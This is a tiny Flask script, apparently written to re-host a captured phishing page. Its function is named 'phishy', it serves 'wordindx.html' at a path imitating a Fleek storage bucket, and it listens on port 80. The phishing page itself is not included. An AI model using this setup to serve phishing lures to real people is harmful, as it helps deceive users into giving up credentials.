from flask import Flask, render_template

app = Flask(__name__, static_folder='', template_folder='storageapi-stg.fleek.co/02eb2591-f5e0-4e2f-a6c1-fc914a8143e9-bucket')

@app.route('/02eb2591-f5e0-4e2f-a6c1-fc914a8143e9-bucket/wordindx.html')
def phishy():
    return render_template('wordindx.html')

if __name__ == '__main__':
    app.run('0.0.0.0', 80)